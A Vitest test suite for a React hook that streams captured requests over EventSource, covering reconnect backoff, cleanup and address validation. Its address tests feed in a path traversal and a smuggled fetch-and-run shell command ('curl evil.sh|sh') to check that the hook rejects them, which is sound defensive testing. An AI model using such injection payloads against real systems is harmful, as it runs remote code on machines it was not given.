import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { act, renderHook } from "@testing-library/react";
import { useHoleStream } from "./useHoleStream";

// Same stand-in the component tests use: BASE_URL is "" in production, and the
// assertions below are about the path the hook builds, not the dev host.
vi.mock("../services", () => ({ default: { BASE_URL: "" } }));

// jsdom has no EventSource. This stub records every source the hook opens and
// leaves its handlers reachable, so a test can open, fail, or feed a stream on
// demand — which is the whole surface a reconnect policy is written against.
type StubSource = {
  url: string;
  onopen: (() => void) | null;
  onmessage: ((event: MessageEvent) => void) | null;
  onerror: (() => void) | null;
  close: () => void;
  closed: boolean;
};

const sources: StubSource[] = [];

// A plain function, not an arrow: the hook calls it with `new`.
function StubEventSource(url: string): StubSource {
  const source = {
    url,
    onopen: null,
    onmessage: null,
    onerror: null,
    closed: false,
  } as StubSource;
  source.close = vi.fn(() => {
    source.closed = true;
  });
  sources.push(source);
  return source;
}

const latest = () => sources[sources.length - 1];

beforeEach(() => {
  sources.length = 0;
  vi.stubGlobal("EventSource", StubEventSource);
  vi.useFakeTimers();
});

afterEach(() => {
  vi.useRealTimers();
  vi.unstubAllGlobals();
  vi.clearAllMocks();
});

describe("useHoleStream", () => {
  it("opens a stream for the given url and reports it live once connected", () => {
    const { result } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );

    expect(sources).toHaveLength(1);
    expect(latest().url).toBe("/api/hole/abc123/events");
    expect(result.current).toBe("connecting");

    act(() => latest().onopen!());

    expect(result.current).toBe("live");
  });

  it("hands each streamed payload to the caller", () => {
    const onMessage = vi.fn();
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage,
        onOpen: vi.fn(),
      }),
    );

    act(() =>
      latest().onmessage!({
        data: '{"request_address":"req001"}',
      } as MessageEvent),
    );

    expect(onMessage).toHaveBeenCalledExactlyOnceWith(
      '{"request_address":"req001"}',
    );
  });

  // The old code closed on error and stopped there: the tail died silently and
  // the list went stale with nothing on screen to say so.
  it("reopens the stream after a failure, reporting the gap while it waits", () => {
    const { result } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    const failed = latest();
    act(() => failed.onopen!());

    act(() => failed.onerror!());

    expect(failed.closed).toBe(true);
    expect(result.current).toBe("reconnecting");
    expect(sources).toHaveLength(1);

    act(() => vi.advanceTimersByTime(1000));

    expect(sources).toHaveLength(2);
    expect(latest().url).toBe("/api/hole/abc123/events");

    act(() => latest().onopen!());

    expect(result.current).toBe("live");
  });

  // A backend that stays down must not be hammered once a second forever.
  it("backs off exponentially up to a cap, opening one stream per delay", () => {
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );

    const openedAfter = (delay: number) => {
      act(() => latest().onerror!());
      const before = sources.length;
      // One tick short of the delay: a schedule that fired early would be
      // indistinguishable from one that fired on time without this.
      act(() => vi.advanceTimersByTime(delay - 1));
      expect(sources).toHaveLength(before);
      act(() => vi.advanceTimersByTime(1));
      expect(sources).toHaveLength(before + 1);
    };

    for (const delay of [1000, 2000, 4000, 8000, 16000, 30000, 30000]) {
      openedAfter(delay);
    }
  });

  // A backend that accepts the connection and drops it a moment later — a
  // crash-looping server, a proxy timing the stream out — used to reset the
  // backoff on every one of those opens, so it reconnected once a second
  // forever. That is the storm, wearing the costume of a healthy connection.
  it("keeps backing off when the stream opens and immediately drops", () => {
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );

    const flapped = (delay: number) => {
      act(() => latest().onopen!());
      act(() => latest().onerror!());
      const before = sources.length;
      act(() => vi.advanceTimersByTime(delay - 1));
      expect(sources).toHaveLength(before);
      act(() => vi.advanceTimersByTime(1));
      expect(sources).toHaveLength(before + 1);
    };

    // Long enough to outlast STABLE_MS. Each open arms the settle timer that
    // resets the backoff, and the error that follows has to disarm it — but
    // while every delay is under 10s the orphaned timers all fire after the
    // test has stopped looking. From 16s on, one lands mid-wait, and a stream
    // that reset its backoff there reopens at 1s instead of 30s.
    for (const delay of [1000, 2000, 4000, 8000, 16000, 30000]) {
      flapped(delay);
    }
  });

  it("starts the backoff over once a connection has held for a while", () => {
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );

    act(() => latest().onerror!());
    act(() => vi.advanceTimersByTime(1000));
    act(() => latest().onerror!());
    act(() => vi.advanceTimersByTime(2000));

    // Open, and hold it — a connection that lasts is the evidence that the
    // thing on the other end is back, not the open itself.
    act(() => latest().onopen!());
    act(() => vi.advanceTimersByTime(10_000));

    act(() => latest().onerror!());
    const before = sources.length;
    act(() => vi.advanceTimersByTime(1000));

    expect(sources).toHaveLength(before + 1);
  });

  // Captures that land while nothing is subscribed are on no stream anybody is
  // reading, so the list has to be re-fetched. That gap opens on the *first*
  // connection too: the caller's snapshot query goes out before the server has
  // registered a subscriber, and anything captured in between lands in neither.
  // So every open asks, not only the ones that follow a failure.
  it("asks the caller to re-sync on every open, including the first", () => {
    const onOpen = vi.fn();
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen,
      }),
    );

    act(() => latest().onopen!());
    expect(onOpen).toHaveBeenCalledTimes(1);

    act(() => latest().onerror!());
    act(() => vi.advanceTimersByTime(1000));
    act(() => latest().onopen!());

    expect(onOpen).toHaveBeenCalledTimes(2);
  });

  // "Reconnecting" reads as a blip worth waiting out. Once several attempts in
  // a row have failed it is not a blip, and the list on screen is stale enough
  // that saying so plainly matters more than staying optimistic.
  it("calls a sustained outage disconnected rather than reconnecting forever", () => {
    const { result } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    act(() => latest().onopen!());

    act(() => latest().onerror!());
    expect(result.current).toBe("reconnecting");

    act(() => vi.advanceTimersByTime(1000));
    act(() => latest().onerror!());
    act(() => vi.advanceTimersByTime(2000));
    act(() => latest().onerror!());

    expect(result.current).toBe("disconnected");

    // Still trying, though — a disconnected tail that never recovers on its
    // own would just be the old bug with a label on it.
    const before = sources.length;
    act(() => vi.advanceTimersByTime(4000));
    expect(sources).toHaveLength(before + 1);
    act(() => latest().onopen!());
    expect(result.current).toBe("live");
  });
});

describe("useHoleStream cleanup", () => {
  it("closes the stream on unmount and schedules nothing after it", () => {
    const { unmount } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    const opened = latest();

    unmount();

    expect(opened.closed).toBe(true);
    act(() => vi.advanceTimersByTime(60_000));
    expect(sources).toHaveLength(1);
  });

  // The retry timer outlives the source it was scheduled from, so closing the
  // source alone would still reopen one for a hole nobody is looking at.
  it("drops a pending retry when it unmounts mid-backoff", () => {
    const { unmount } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    act(() => latest().onerror!());

    unmount();
    act(() => vi.advanceTimersByTime(60_000));

    expect(sources).toHaveLength(1);
  });

  // Two errors from one EventSource is one failed connection, not two. Acting
  // on both armed two retries from a single `retry` handle, so the earlier
  // timer's stream was opened and then forgotten: never closed, never closed
  // on unmount either, and still handing every frame it received to the
  // caller — a subscriber the backend keeps for a hole nobody is watching.
  it("opens one replacement even if the same source errors twice", () => {
    const { unmount } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    const failing = latest();

    act(() => failing.onerror!());
    act(() => failing.onerror!());
    act(() => vi.advanceTimersByTime(60_000));

    expect(sources).toHaveLength(2);

    unmount();
    expect(sources.every((source) => source.closed)).toBe(true);
  });

  // The second error also must not count as a second failure: the backoff is
  // counted in connections that failed, so a source that errors twice would
  // otherwise skip a step of the schedule.
  it("counts one failure per source, not one per error", () => {
    renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );

    const failing = latest();
    act(() => failing.onerror!());
    act(() => failing.onerror!());
    act(() => vi.advanceTimersByTime(1000));

    // The second connection is the second attempt, so it waits 2s — not the
    // 4s a doubly-counted first failure would produce.
    act(() => latest().onerror!());
    act(() => vi.advanceTimersByTime(1999));
    expect(sources).toHaveLength(2);
    act(() => vi.advanceTimersByTime(1));
    expect(sources).toHaveLength(3);
  });

  // An error from a source we have already moved on from arrives after the
  // reconnect that replaced it — and the handler used to act on whatever
  // `source` pointed at by then, which is the healthy stream.
  it("ignores an error from a source it has already replaced", () => {
    const { result } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    const failed = latest();

    act(() => failed.onerror!());
    act(() => vi.advanceTimersByTime(1000));
    const replacement = latest();
    act(() => replacement.onopen!());
    expect(result.current).toBe("live");

    act(() => failed.onerror!());

    expect(replacement.closed).toBe(false);
    expect(result.current).toBe("live");
    expect(sources).toHaveLength(2);
  });

  // Closing a source does not un-queue an error it has already scheduled, so
  // the handler can run after cleanup has. Arming a retry from there is a
  // reopened stream for a hole nobody is watching, and cleanup's own
  // `clearTimeout` has already been and gone.
  it("ignores an error that lands after it has been torn down", () => {
    const { unmount } = renderHook(() =>
      useHoleStream({
        holeAddress: "abc123",
        onMessage: vi.fn(),
        onOpen: vi.fn(),
      }),
    );
    const opened = latest();

    unmount();
    act(() => opened.onerror!());
    act(() => vi.advanceTimersByTime(60_000));

    expect(sources).toHaveLength(1);
  });

  it("closes the old stream and opens one for the new hole", () => {
    const { rerender } = renderHook(
      ({ holeAddress }) =>
        useHoleStream({ holeAddress, onMessage: vi.fn(), onOpen: vi.fn() }),
      { initialProps: { holeAddress: "aaaaaa" } },
    );
    const first = latest();

    rerender({ holeAddress: "bbbbbb" });

    expect(first.closed).toBe(true);
    expect(sources).toHaveLength(2);
    expect(latest().url).toBe("/api/hole/bbbbbb/events");
  });

  // Carrying the previous hole's verdict over would report a fresh stream as
  // dead before it has had a chance to connect.
  it("does not carry one hole's failure over to the next", () => {
    const { result, rerender } = renderHook(
      ({ holeAddress }) =>
        useHoleStream({ holeAddress, onMessage: vi.fn(), onOpen: vi.fn() }),
      { initialProps: { holeAddress: "aaaaaa" } },
    );
    act(() => latest().onerror!());
    expect(result.current).toBe("reconnecting");

    rerender({ holeAddress: "bbbbbb" });

    expect(result.current).toBe("connecting");
  });
});

// The address arrives from the route, so it is whatever a link said it was.
// The check lives here rather than at the call site: the hook is the thing
// that builds a URL out of it, and a second caller must not be able to skip it.
describe("useHoleStream address handling", () => {
  it.each([
    ["an empty address", ""],
    ["a traversal", "a/../api"],
    ["a shell injection attempt", "abc\ncurl evil.sh|sh"],
    ["an overlong address", "abcdefg"],
  ])(
    "opens nothing for %s, and says the tail is dead",
    (_label, holeAddress) => {
      const { result } = renderHook(() =>
        useHoleStream({ holeAddress, onMessage: vi.fn(), onOpen: vi.fn() }),
      );

      expect(sources).toHaveLength(0);
      // Not "connecting": nothing is being attempted and nothing will recover.
      expect(result.current).toBe("disconnected");
    },
  );

  // Reported as live for a stream that does not exist, because the early
  // return skipped the state reset on the way past.
  it("stops reporting the old hole as live when the address goes bad", () => {
    const { result, rerender } = renderHook(
      ({ holeAddress }) =>
        useHoleStream({ holeAddress, onMessage: vi.fn(), onOpen: vi.fn() }),
      { initialProps: { holeAddress: "aaaaaa" } },
    );
    act(() => latest().onopen!());
    expect(result.current).toBe("live");

    rerender({ holeAddress: "a/../api" });

    expect(result.current).toBe("disconnected");
  });
});
